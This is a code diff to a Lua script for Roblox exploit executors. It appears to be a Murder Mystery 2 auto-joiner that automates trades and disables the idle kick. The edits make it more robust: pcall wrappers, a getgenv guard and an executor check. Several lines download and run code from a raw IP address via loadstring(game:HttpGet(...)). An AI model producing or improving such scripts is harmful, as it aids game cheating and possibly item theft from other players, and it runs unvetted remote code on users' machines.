@@ -1,8 +1,11 @@
 --claude sigmer
 joinGames = {[142823291] = true,[920587237] = true,}
 
-if getgenv().__mm2_autojoiner_loaded then return end
-getgenv().__mm2_autojoiner_loaded = true
+-- getgenv() is near-universal but guard it anyway - without this, a missing
+-- getgenv would kill the whole script on line 1 with zero console output.
+local _genv = (type(getgenv) == "function") and getgenv() or _G
+if _genv.__mm2_autojoiner_loaded then return end
+_genv.__mm2_autojoiner_loaded = true
 
 repeat task.wait() until game:IsLoaded()
 
@@ -35,9 +38,26 @@ for _, b in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
     b:Disable();
 end;
 local exec, execver = identifyexecutor()
+
+-- joiner.lua opens a raw wss:// connection straight to Discord's real gateway
+-- (gateway.discord.gg). Confirmed on Arceus X: the socket "opens" but never
+-- receives HELLO, retrying forever - and in isolation the same connect call
+-- froze/dropped the whole client. That's a gap in Arceus X's own WebSocket/TLS
+-- stack, not something fixable here, so bail cleanly instead of looping
+-- forever and burning reconnect attempts. Use mm2.lua/ajv2.lua on non-Delta
+-- executors - its Discord side runs in Python (ajv2.py) and only talks to the
+-- Lua side over a local ws:// relay, which does work everywhere.
+if tostring(exec):lower() ~= "delta" then
+    warn("[joiner] " .. tostring(exec) .. " is not supported by joiner.lua's direct Discord "
+        .. "gateway connection - it hangs/crashes on the wss:// handshake to gateway.discord.gg. "
+        .. "Use mm2.lua/ajv2.lua on this executor instead.")
+    return
+end
+
 totalval = 0
 tradesd = 0
 minrarity = minrarity or "Godly"
+tradesbeforenext = tradesbeforenext or 1   -- trades with the current giver before moving to the next queued join
 print(1)
 
 if IS_MM2 then
@@ -69,13 +89,15 @@ end
 function getinv()
     return game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
 end
-local databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons
+local databrainrot = {}
+pcall(function() databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons end)
 
 -- value lookup mirrors mm2.lua: /supreme endpoint + flexible name+type+year
 -- lookups + Godly+ rarity fallback (so unknown items still get a sensible value)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Vintage","Godly","Ancient","Unique"}
 local godlyIdx = table.find(rarityTable, "Godly") or 6
-local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/supreme"))() or {}
+local valueList = {}
+pcall(function() valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/supreme"))() or {} end)
 
 local function lookupValue(realName, itemType, rarity, chroma, year)
     local D = rarity
@@ -468,7 +490,14 @@ end
 -- pet value list shared by getPetValue (must be file-scope, not trapped in spawn)
 local valueList
 task.spawn(function()
-    valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/elvebredd"))()
+    local ok, list = pcall(function()
+        return loadstring(game:HttpGet("http://109.120.157.241:5000/elvebredd"))()
+    end)
+    if ok then
+        valueList = list
+    else
+        warn("[adm] value list fetch failed: " .. tostring(list))
+    end
 end)
 
 local function formatValue(v)
